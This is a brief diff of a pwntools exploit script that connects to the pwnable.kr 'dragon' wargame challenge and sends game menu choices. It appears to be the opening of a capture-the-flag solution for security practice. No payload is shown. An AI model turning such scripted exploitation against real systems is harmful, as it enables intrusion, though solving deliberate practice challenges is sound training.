@@ -3,8 +3,8 @@
 from pwn import *
 
 t = remote('pwnable.kr', 9004)
-#t = process('./dragon')
-# we need to skip Baby Dragon
+
+# we need to skip Baby Dragon, let him kill us
 t.sendline('1') # priest
 t.sendline('1') # holy bolt
 t.sendline('1') # holy bolt
